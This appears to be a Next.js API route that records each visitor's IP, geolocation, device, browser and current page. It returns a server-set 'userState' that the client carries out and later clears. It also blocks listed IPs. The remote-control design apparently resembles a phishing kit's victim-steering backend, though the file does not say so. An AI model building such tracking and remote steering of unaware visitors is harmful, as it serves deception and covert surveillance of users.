import { NextRequest, NextResponse } from 'next/server';
import { updateSession, getSession, clearUserState } from '@/lib/session-store';
import { isIpBlocked } from '@/lib/config-store';

// Helper function to get client IP from various headers
function getClientIP(req: NextRequest): string {
  // Try multiple headers in order of preference
  const forwarded = req.headers.get('x-forwarded-for');
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  const realIp = req.headers.get('x-real-ip');
  if (realIp) {
    return realIp;
  }
  
  const clientIp = req.headers.get('cf-connecting-ip'); // Cloudflare
  if (clientIp) {
    return clientIp;
  }

  // Fallback to socket address
  const socket = req.socket?.remoteAddress;
  if (socket) {
    return socket;
  }

  return 'Unknown';
}

// Helper function to get geolocation from IP
async function getGeolocation(ip: string): Promise<{ country?: string; city?: string }> {
  try {
    if (ip === 'Unknown' || ip === '127.0.0.1' || ip === 'localhost' || ip === '::1') {
      return { country: 'Local', city: 'Local' };
    }
    
    // Try multiple geolocation APIs for better reliability
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
      });
      
      if (response.ok) {
        const data = await response.json();
        return {
          country: data.country_name || data.country || 'Unknown',
          city: data.city || 'Unknown'
        };
      }
    } catch (e) {
      console.log('ipapi.co failed, trying alternative...');
    }

    // Fallback to ip-api.com
    try {
      const response = await fetch(`http://ip-api.com/json/${ip}`);
      if (response.ok) {
        const data = await response.json();
        if (data.status === 'success') {
          return {
            country: data.country || 'Unknown',
            city: data.city || 'Unknown'
          };
        }
      }
    } catch (e) {
      console.log('ip-api.com failed');
    }
  } catch (error) {
    console.error('Geolocation lookup failed:', error);
  }
  
  return { country: 'Unknown', city: 'Unknown' };
}

// API to update session and check for control commands
export async function POST(req: NextRequest) {
  try {
    const { sessionId, currentPage, userAgent } = await req.json();

    if (!sessionId || !currentPage) {
      return NextResponse.json({ error: 'Missing sessionId or currentPage' }, { status: 400 });
    }

    const clientIP = getClientIP(req);
    
    // Check if IP is blocked
    if (isIpBlocked(clientIP)) {
      return NextResponse.json({ 
        userState: 'block',
        blocked: true,
        reason: 'IP is blocked'
      });
    }

    const geo = await getGeolocation(clientIP);

    // Parse user agent to get device and browser info
    let device = 'Unknown';
    let browser = 'Unknown';

    if (userAgent) {
      // Simple device detection
      if (/mobile|android|iphone|ipad|phone/i.test(userAgent)) {
        device = 'Mobile';
      } else if (/tablet|ipad/i.test(userAgent)) {
        device = 'Tablet';
      } else {
        device = 'Desktop';
      }

      // Simple browser detection
      if (/chrome/i.test(userAgent) && !/edge/i.test(userAgent)) {
        browser = 'Chrome';
      } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
        browser = 'Safari';
      } else if (/firefox/i.test(userAgent)) {
        browser = 'Firefox';
      } else if (/edge/i.test(userAgent)) {
        browser = 'Edge';
      } else if (/opera|opr/i.test(userAgent)) {
        browser = 'Opera';
      }
    }

    const session = updateSession(sessionId, {
      currentPage,
      ip: clientIP,
      country: geo.country,
      device,
      browser,
    });

    // Return the current user state for the client to act upon
    return NextResponse.json({ userState: session.userState });
  } catch (error) {
    console.error('Session update error:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}

// API to clear user state after client execution
export async function DELETE(req: NextRequest) {
  try {
    const { sessionId } = await req.json();

    if (!sessionId) {
      return NextResponse.json({ error: 'Missing sessionId' }, { status: 400 });
    }

    const session = clearUserState(sessionId);

    if (!session) {
      return NextResponse.json({ error: 'Session not found' }, { status: 404 });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Clear state error:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}
